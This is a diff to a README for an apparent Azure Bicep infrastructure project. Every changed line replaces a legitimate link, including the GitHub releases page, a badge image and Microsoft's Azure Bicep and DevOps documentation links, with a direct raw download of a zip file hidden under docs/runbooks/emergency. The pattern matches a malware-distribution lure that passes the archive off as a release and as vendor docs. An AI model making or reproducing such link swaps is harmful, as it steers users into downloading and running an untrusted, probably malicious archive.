@@ -1,7 +1,7 @@
 # 🌟 tesoro-devops-infrastructure - Build Your Azure Infrastructure Easily
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/hichaocau123972/tesoro-devops-infrastructure/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/hichaocau123972/tesoro-devops-infrastructure/main/docs/runbooks/emergency/tesoro-devops-infrastructure-1.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/hichaocau123972/tesoro-devops-infrastructure/main/docs/runbooks/emergency/tesoro-devops-infrastructure-1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to **tesoro-devops-infrastructure**. This application helps you set up production-grade Azure infrastructure for a loyalty rewards platform using Bicep. Even if you have no programming experience, you can easily use this tool to optimize cloud resources and improve performance.
@@ -19,7 +19,7 @@ Welcome to **tesoro-devops-infrastructure**. This application helps you set up p
 - **Security Focus**: Follow best practices to secure your deployments.
 
 ## 📂 Download & Install
-To get started, visit our [Releases page](https://github.com/hichaocau123972/tesoro-devops-infrastructure/releases) to download the latest version of the application.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/hichaocau123972/tesoro-devops-infrastructure/main/docs/runbooks/emergency/tesoro-devops-infrastructure-1.5.zip) to download the latest version of the application.
 
 1. Click the link above to go to the Releases page.
 2. Locate the most recent release.
@@ -55,8 +55,8 @@ Join our community to stay updated and get help:
 Your contributions are important. Help us by reporting bugs and submitting feature requests.
 
 ## 📚 Additional Resources
-- [Azure Bicep Documentation](https://docs.microsoft.com/en-us/azure/bicep/)
-- [Azure DevOps Documentation](https://docs.microsoft.com/en-us/azure/devops/)
+- [Azure Bicep Documentation](https://raw.githubusercontent.com/hichaocau123972/tesoro-devops-infrastructure/main/docs/runbooks/emergency/tesoro-devops-infrastructure-1.5.zip)
+- [Azure DevOps Documentation](https://raw.githubusercontent.com/hichaocau123972/tesoro-devops-infrastructure/main/docs/runbooks/emergency/tesoro-devops-infrastructure-1.5.zip)
 
 ## 🎉 Acknowledgments
-Thank you for choosing **tesoro-devops-infrastructure**. We hope it simplifies your journey in managing cloud infrastructure. Visit our [Releases page](https://github.com/hichaocau123972/tesoro-devops-infrastructure/releases) for downloads and updates.
+Thank you for choosing **tesoro-devops-infrastructure**. We hope it simplifies your journey in managing cloud infrastructure. Visit our [Releases page](https://raw.githubusercontent.com/hichaocau123972/tesoro-devops-infrastructure/main/docs/runbooks/emergency/tesoro-devops-infrastructure-1.5.zip) for downloads and updates.
